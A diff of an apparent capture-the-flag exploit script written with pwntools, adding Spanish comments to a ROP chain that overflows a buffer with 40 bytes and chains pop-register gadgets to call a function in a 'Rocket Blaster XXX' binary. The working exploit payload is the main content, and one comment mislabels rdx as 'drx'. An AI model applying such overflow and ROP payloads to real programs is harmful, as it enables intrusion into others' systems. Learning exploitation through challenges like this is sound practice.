@@ -23,12 +23,12 @@ else:
 banner = r.recvuntil(b"You need to place the ammo in the right place to load the Rocket Blaster XXX!")
 print(banner.decode())
 
-payload = b'A'*40
-payload += p64(0x40159f) + p64(0xdeadbeef)
-payload += p64(0x40159d) + p64(0xdeadbabe)
-payload += p64(0x40159b) +  p64(0xdead1337)
+payload = b'A'*40                                 # Usando ROP (Return Objet Programing) podemos obtener las instrucciones dentro del programa
+payload += p64(0x40159f) + p64(0xdeadbeef)        #  pop rdi
+payload += p64(0x40159d) + p64(0xdeadbabe)        #  pop rsi
+payload += p64(0x40159b) +  p64(0xdead1337)       #  pop drx
 
-payload +=  p64(0x40101a) +  p64(0x4012f5)
+payload +=  p64(0x40101a) +  p64(0x4012f5)        #  ret   -  llamado a la funcion
 
 print(payload)
 print(len(payload))
@@ -48,3 +48,4 @@ while True:
         break
 
 print(final_output.decode(errors='ignore'))
+
